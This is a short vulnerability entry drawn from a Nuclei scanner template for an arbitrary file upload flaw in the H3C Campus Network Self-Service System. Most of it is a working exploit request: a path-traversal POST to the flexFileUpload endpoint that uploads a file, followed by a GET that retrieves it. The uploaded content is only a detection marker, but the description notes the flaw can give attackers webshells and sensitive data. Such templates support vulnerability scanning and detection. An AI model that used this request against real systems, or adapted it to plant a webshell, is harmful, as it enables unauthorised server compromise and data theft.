# Vulnerability: H3C CNSSS - Arbitrary File Upload
**Classification:** H3C
**Source:** Nuclei Template (`h3c-cnsss-arbitrary-file-upload.yaml`)

## Description
H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q

-----------------WebKitFormBoundaryMmx988TUuintqO4Q
Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"
Content-Type: application/octet-stream

{{md5(num)}}
-----------------WebKitFormBoundaryMmx988TUuintqO4Q--

GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1
Host: {{Hostname}}
```

